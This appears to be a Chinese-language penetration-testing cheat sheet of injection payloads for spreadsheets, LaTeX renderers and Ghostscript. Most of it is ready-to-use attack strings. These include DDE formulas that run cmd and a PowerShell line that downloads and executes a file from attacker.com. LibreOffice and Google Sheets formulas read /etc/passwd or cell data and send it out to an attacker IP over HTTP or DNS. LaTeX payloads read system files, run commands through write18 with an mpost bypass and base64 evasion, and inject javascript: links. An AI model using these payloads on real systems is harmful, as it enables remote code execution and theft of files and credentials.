# Formula/CSV/Doc/LaTeX/GhostScript Injection

## 0x01 Formula Injection (公式注入 / CSV 注入)

**场景**：输入被反射到 CSV/Excel 文件中。

**字典**：[csv-injection-intruder.txt](.\assets\csv-injection-intruder.txt)

> [!CAUTION]
>
> 现在 **Excel 会警告**（多次） **用户当从外部加载内容时**，以防止他进行恶意操作。因此，必须在最终有效载荷上特别努力进行社会工程。

---

### 1.1 基础命令执行 (DDE & Shell)

通过动态数据交换（DDE）执行系统命令（需用户交互）：

- **基础 Payload**: `=cmd|' /C calc'!A0`

- **PowerShell 反弹/下线**:

  ```bash
  =cmd|'/C powershell IEX(wget attacker.com/shell.exe)'!A0
  ```

- **常用前缀绕过**: `DDE ("cmd";"/C calc";"!A0")A0` 或 `@SUM(1+9)*cmd|' /C calc'!A0`

---

### 1.2 LibreOffice Calc 专项利用 (LFI & 敏感数据外泄)

LibreOffice 允许通过公式直接读取本地文件并外发，**无需 DDE 权限**。

- **读取本地文件 (LFI)**:

  - 读取第一行: `='file:///etc/passwd'#$passwd.A1`

- **HTTP 外泄**:

  - `=WEBSERVICE(CONCATENATE("http://<攻击者IP>:8080/", ('file:///etc/passwd'#$passwd.A1)))`

- **多行外泄 (使用 $ 分隔)**:

  - `=WEBSERVICE(CONCATENATE("http://<攻击者IP>:8080/", ('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`

- **DNS 隧道外泄 (绕过出站防火墙)**:

  - 利用 `SUBSTITUTE` 处理坏字符，将内容作为子域名查询：

    `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<攻击者域名>"))`

---

### 1.3 Google Sheets OOB 数据带外外泄

- **CONCATENATE**: 将字符串连接在一起 - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: 从结构化数据类型导入数据 - `=IMPORTXML(CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: 导入 RSS 或 ATOM 订阅源 - `=IMPORTFEED(CONCAT("http://<attacker IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: 从 HTML 表格或列表中导入数据 - `=IMPORTHTML (CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: 从另一个电子表格导入一系列单元格 - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
- **IMAGE**: 在单元格中插入图像 - `=IMAGE("https://<attacker IP:Port>/images/srpr/logo3w.png")`

------

## 0x02 LaTeX Injection (LaTeX 注入)

**场景**：Web 应用将用户输入的 LaTeX 代码渲染为 PDF（常见于简历生成、学术工具）。

---

### 2.1 核心配置参数

- `--no-shell-escape`: 禁用 `\write18`（最安全）。
- `--shell-restricted`: 仅允许执行部分“安全”命令（如 `mpost`）。
- `--shell-escape`: 允许执行任意系统命令（极度危险）。

---

### 2.2 文件操作

- **读取文件**:

  ```bash
  \input{/etc/passwd}
  \include{password} # load .tex file
  \lstinputlisting{/etc/passwd}
  \usepackage{verbatim}
  \verbatiminput{/etc/passwd}
  ```

- **读取单行文件**

  ```bash
  \newread\file
  \openin\file=/etc/issue
  \read\file to\line
  \text{\line}
  \closein\file
  ```

- **多行读取循环**:

  ```bash
  \newread\file
  \openin\file=/etc/passwd
  \loop\unless\ifeof\file
  \read\file to\fileline
  \text{\fileline}
  \repeat
  \closein\file
  ```

- **写入文件**:

  ```bash
  \newwrite\outfile
  \openout\outfile=cmd.tex
  \write\outfile{Hello-world}
  \closeout\outfile
  ```

---

### 2.3 命令执行 (RCE)

- **直接执行**: `\immediate\write18{env > output} \input{output}`

- **特定命令绕过 (mpost)**:

  ```bash
  \immediate\write18{env > output}
  \input{output}
  
  \input{|"/bin/hostname"}
  \input{|"extractbb /etc/passwd > /tmp/b.tex"}
  
  # allowed mpost command RCE
  \documentclass{article}\begin{document}
  \immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
  \end{document}
  
  # If mpost is not allowed there are other commands you might be able to execute
  ## Just get the version
  \input{|"bibtex8 --version > /tmp/b.tex"}
  ## Search the file pdfetex.ini
  \input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
  ## Get env var value
  \input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
  ## Get the value of shell_escape_commands without needing to read pdfetex.ini
  \input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
  
  ```

- **Base64 规避**: `\immediate\write18{env | base64 > test.tex} \input{test.tex}`

---

### 2.4 跨站脚本攻击

```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

------

## 0x03 Ghostscript Injection (Ghostscript 注入)

**场景**：处理图像 (ImageMagick) 或 PDF 的后端。

- **关键点**：Ghostscript 在解析文件路径时存在逻辑漏洞，可实现沙盒绕过。
- **参考**：关注 2023 年后的 Ghostscript 路径解析漏洞（如 CVE-2023-36664）。
- **详见**：[ghostscript-overview](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)



